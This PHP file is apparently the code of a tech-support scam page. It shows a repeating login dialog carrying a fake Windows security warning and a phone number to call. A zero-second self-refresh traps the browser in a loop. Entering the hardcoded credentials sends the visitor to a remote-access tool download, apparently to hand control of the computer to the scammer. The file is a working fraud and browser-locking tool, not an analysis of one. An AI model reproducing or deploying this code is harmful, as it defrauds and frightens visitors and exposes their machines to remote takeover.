<?php
    session_start();

    $_user = 'windows2019';
    $_password = 'microsoft9';

    if ($_SERVER['PHP_AUTH_USER'] != $_user || $_SERVER['PHP_AUTH_PW'] != $_password ) {

        if(isset($_SESSION['login_attempts'])){ $_SESSION['login_attempts']++; }else{$_SESSION['login_attempts'] = 11;}

        if($_SESSION['login_attempts'] == 80){
            header('Location: fdsawqwq22121sdsd.php');
            exit;
        } else {

           header('WWW-Authenticate: Basic realm="Windows & Internet Browser updates are needed to patch new security flaws and / or fix bugs in the system. If you have yout computer connected to the Internet, you desperately need to keep your security as up to date as possible. Updates patch security vulnerabilities that could allow a system to become compromised Please call to get it fixed Call : +1-833-629-0428  (Tollfree)"');
           header('HTTP/1.0 401 Unauthorized');
$page = $_SERVER['PHP_SELF'];
 $sec = "0";
 header("Refresh: $sec; url=$page");
         echo "<html><head><title>Internet Security Damaged !!! Call Help Desk</title></head><body>";


            exit;
        }
    } else {

        header('Location: fdsawqwq22121sdsd.php');
        header('Location: http://download.teamviewer.com/download/TeamViewer_Setup_en.exe');

        exit;
    }
?>
